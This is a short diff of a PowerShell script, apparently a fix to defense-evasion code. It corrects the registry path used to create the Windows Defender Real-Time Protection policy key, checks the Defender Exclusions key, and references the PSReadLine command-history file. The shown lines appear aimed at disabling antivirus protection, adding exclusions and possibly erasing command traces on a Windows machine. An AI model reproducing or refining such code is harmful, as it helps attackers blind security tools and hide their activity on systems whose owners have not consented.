@@ -2,7 +2,7 @@ Import-Module BitsTransfer;
 $filePath = [Environment]::GetFolderPath('ApplicationData') + '\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt'
 
 if (!(Test-Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection')) {
-    New-Item -Path "Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" -Force
+    New-Item -Path "Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Force
 }
 
 if (!(Test-Path 'HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\')) {
